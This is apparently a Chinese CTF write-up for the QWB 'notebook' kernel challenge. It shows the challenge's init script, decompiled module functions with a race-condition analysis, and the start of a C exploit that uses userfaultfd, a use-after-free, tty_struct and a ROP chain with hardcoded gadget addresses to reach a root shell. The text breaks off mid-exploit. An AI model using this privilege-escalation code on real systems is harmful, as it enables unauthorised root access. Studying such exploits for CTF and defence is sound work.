<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/devices/system/cpu/vulnerabilities/*</span><br><span class="line">Mitigation: PTI</span><br><span class="line">Mitigation: __user pointer sanitization</span><br><span class="line">Mitigation: Full generic retpoline</span><br></pre></td></tr></table></figure>

<p><strong>文件系统启动脚本</strong></p>
<figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line">/bin/mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:tty /dev/console</span><br><span class="line">chown root:tty /dev/ptmx</span><br><span class="line">chown root:tty /dev/tty</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line"></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line"></span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line"></span><br><span class="line">ifup eth0 &gt; /dev/null 2&gt;/dev/null</span><br><span class="line"></span><br><span class="line">insmod notebook.ko</span><br><span class="line">cat /proc/modules | grep notebook &gt; /tmp/moduleaddr</span><br><span class="line">chmod 777 /tmp/moduleaddr</span><br><span class="line">chmod 777 /dev/notebook</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Welcome to QWB!&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#sh</span></span><br><span class="line">setsid cttyhack setuidgid 0000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 1 -n -f</span><br></pre></td></tr></table></figure>

<p>这道题虽然是堆喷，但是最关键的还是条件竞争，而且是我现在水平来看是比较难以察觉但是理解了又觉得十分厉害的利用,条件竞争主要还是使用<code>copy</code>函数，漏洞就出在<code>add</code>和<code>edit</code>函数中</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">noteedit</span><span class="params">(<span class="keyword">size_t</span> idx, <span class="keyword">size_t</span> newsize, <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r13</span></span><br><span class="line">  note *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> size; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// r12</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(idx);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">-1LL</span>;</span><br><span class="line">    printk(<span class="string">&quot;[x] Edit idx out of range.\n&quot;</span>, newsize);</span><br><span class="line">    <span class="keyword">return</span> v8;</span><br><span class="line">  &#125;</span><br><span class="line">  v4 = v3;</span><br><span class="line">  v5 = &amp;notebook[idx];</span><br><span class="line">  raw_read_lock(&amp;lock);</span><br><span class="line">  size = v5-&gt;size;</span><br><span class="line">  v5-&gt;size = newsize;</span><br><span class="line">  <span class="keyword">if</span> ( size == newsize )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">1LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> editout;</span><br><span class="line">  &#125;</span><br><span class="line">  v7 = (*(__int64 (__fastcall **)(<span class="keyword">void</span> *, <span class="keyword">size_t</span>, __int64))krealloc.gap0)(v5-&gt;note, newsize, <span class="number">37748928LL</span>);</span><br><span class="line">  copy_from_user(name, v4, <span class="number">0x100</span>LL);</span><br><span class="line">  <span class="keyword">if</span> ( !v5-&gt;size )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;free in fact&quot;</span>);</span><br><span class="line">    v5-&gt;note = <span class="number">0LL</span>;</span><br><span class="line">    v8 = <span class="number">0LL</span>;</span><br><span class="line">    <span class="keyword">goto</span> editout;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)_virt_addr_valid(v7) )</span><br><span class="line">  &#123;</span><br><span class="line">    v5-&gt;note = (<span class="keyword">void</span> *)v7;</span><br><span class="line">    v8 = <span class="number">2LL</span>;</span><br><span class="line">editout:</span><br><span class="line">    raw_read_unlock(&amp;lock);</span><br><span class="line">    printk(<span class="string">&quot;[o] Edit success. %s edit a note.\n&quot;</span>, name);</span><br><span class="line">    <span class="keyword">return</span> v8;</span><br><span class="line">  &#125;</span><br><span class="line">  printk(<span class="string">&quot;[x] Return ptr unvalid.\n&quot;</span>);</span><br><span class="line">  raw_read_unlock(&amp;lock);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">3LL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">noteadd</span><span class="params">(<span class="keyword">size_t</span> idx, <span class="keyword">size_t</span> size, <span class="keyword">void</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v4; <span class="comment">// r13</span></span><br><span class="line">  note *v5; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">size_t</span> v6; <span class="comment">// r14</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line"></span><br><span class="line">  _fentry__(idx, size, buf);</span><br><span class="line">  <span class="keyword">if</span> ( idx &gt; <span class="number">0xF</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v8 = <span class="number">-1LL</span>;</span><br><span class="line">    printk(<span class="string">&quot;[x] Add idx out of range.\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v4 = v3;</span><br><span class="line">    v5 = &amp;notebook[idx];</span><br><span class="line">    raw_read_lock(&amp;lock);</span><br><span class="line">    v6 = v5-&gt;size;</span><br><span class="line">    v5-&gt;size = size;</span><br><span class="line">    <span class="keyword">if</span> ( size &gt; <span class="number">0x60</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v5-&gt;size = v6;</span><br><span class="line">      v8 = <span class="number">-2LL</span>;</span><br><span class="line">      printk(<span class="string">&quot;[x] Add size out of range.\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      copy_from_user(name, v4, <span class="number">0x100</span>LL);</span><br><span class="line">      <span class="keyword">if</span> ( v5-&gt;note )</span><br><span class="line">      &#123;</span><br><span class="line">        v5-&gt;size = v6;</span><br><span class="line">        v8 = <span class="number">-3LL</span>;</span><br><span class="line">        printk(<span class="string">&quot;[x] Add idx is not empty.\n&quot;</span>, v4, v7);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        v5-&gt;note = (<span class="keyword">void</span> *)_kmalloc(size, <span class="number">37748928LL</span>);</span><br><span class="line">        printk(<span class="string">&quot;[+] Add success. %s left a note.\n&quot;</span>, name);</span><br><span class="line">        v8 = <span class="number">0LL</span>;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    raw_read_unlock(&amp;lock);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v8;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="解法一-userfaultfd-uaf-tty-struct-rop"><a href="#解法一-userfaultfd-uaf-tty-struct-rop" class="headerlink" title="解法一:userfaultfd+uaf+tty_struct+rop"></a><strong>解法一</strong>:userfaultfd+uaf+tty_struct+rop</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/userfaultfd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/sem.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;poll.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;linux/tty.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> tty_struct_size 0x2e0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ptm_unix98_ops_offset 0xe8e440</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pty_unix98_ops_offset 0xe8e320</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdi_pop_rsp_pop_rbp_add_rax_rdx_ret 0xffffffff81238d50</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdx_add_byte_r11_0x41_r11b_pop_rsp_pop_rbp_ret 0xffffffff8170dd41</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds 0xffffffff810a9b40</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> init_cred 0xffffffff8225c940</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> swapgs_restore_regs_and_return_to_usermode 0xffffffff81a00929</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdi_ret 0xffffffff81007115</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_pop_rbp_ret   0xffffffff8103658c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> push_rdi_pop_rsp_pop_rbp_or_eax_edx_ret   0xffffffff8143f4e1</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rsp_ret 0xffffffff810bc110</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> ret 0xffffffff81000091</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred 0xffffffff810a9ef0 </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> mov_rdi_rax_call_rdx  0xffffffff8270747f</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pop_rdx_ret 0xffffffff81358842</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MOV_RDI_RAX_POP_RBP_RET 0xffffffff81045833</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="keyword">size_t</span> kernel_base=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">saveStatus</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;getshelling&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> *page;</span><br><span class="line"><span class="keyword">size_t</span> page_size;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">pthread_t</span> monitor_thread;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">errExit</span><span class="params">(<span class="keyword">char</span> *msg)</span></span>&#123;</span><br><span class="line">    <span class="built_in">puts</span>(msg);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">registerUserFaultFd</span><span class="params">(<span class="keyword">void</span> * addr, <span class="keyword">unsigned</span> <span class="keyword">long</span> len, <span class="keyword">void</span> (*handler)(<span class="keyword">void</span>*))</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_api</span> <span class="title">uffdio_api</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_register</span> <span class="title">uffdio_register</span>;</span></span><br><span class="line">    <span class="keyword">int</span> s;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Create and enable userfaultfd object */</span></span><br><span class="line">    uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK);</span><br><span class="line">    <span class="keyword">if</span> (uffd == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;userfaultfd&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_api.api = UFFD_API;</span><br><span class="line">    uffdio_api.features = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_API, &amp;uffdio_api) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_API&quot;</span>);</span><br><span class="line"></span><br><span class="line">    uffdio_register.range.start = (<span class="keyword">unsigned</span> <span class="keyword">long</span>) addr;</span><br><span class="line">    uffdio_register.range.len = len;</span><br><span class="line">    uffdio_register.mode = UFFDIO_REGISTER_MODE_MISSING;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(uffd, UFFDIO_REGISTER, &amp;uffdio_register) == <span class="number">-1</span>)</span><br><span class="line">        errExit(<span class="string">&quot;ioctl-UFFDIO_REGISTER&quot;</span>);</span><br><span class="line"></span><br><span class="line">    s = pthread_create(&amp;monitor_thread, <span class="literal">NULL</span>, handler, (<span class="keyword">void</span> *) uffd);</span><br><span class="line">    <span class="keyword">if</span> (s != <span class="number">0</span>)</span><br><span class="line">        errExit(<span class="string">&quot;pthread_create&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> *</span></span><br><span class="line"><span class="function"><span class="title">fault_handler_thread</span><span class="params">(<span class="keyword">void</span> *arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffd_msg</span> <span class="title">msg</span>;</span></span><br><span class="line">    <span class="keyword">int</span> fault_cnt = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">long</span> uffd;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">uffdio_copy</span> <span class="title">uffdio_copy</span>;</span></span><br><span class="line">    <span class="keyword">ssize_t</span> nread;</span><br><span class="line"></span><br><span class="line">    uffd = (<span class="keyword">long</span>) arg;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;;) </span><br><span class="line">    &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pollfd</span> <span class="title">pollfd</span>;</span></span><br><span class="line">        <span class="keyword">int</span> nready;</span><br><span class="line">        pollfd.fd = uffd;</span><br><span class="line">        pollfd.events = POLLIN;</span><br><span class="line">        nready = poll(&amp;pollfd, <span class="number">1</span>, <span class="number">-1</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nready == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;poll&quot;</span>);</span><br><span class="line"></span><br><span class="line">        nread = read(uffd, &amp;msg, <span class="keyword">sizeof</span>(msg));</span><br><span class="line"></span><br><span class="line">        sleep(<span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">0</span>)</span><br><span class="line">            errExit(<span class="string">&quot;EOF on userfaultfd!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (nread == <span class="number">-1</span>)</span><br><span class="line">            errExit(<span class="string">&quot;read&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> 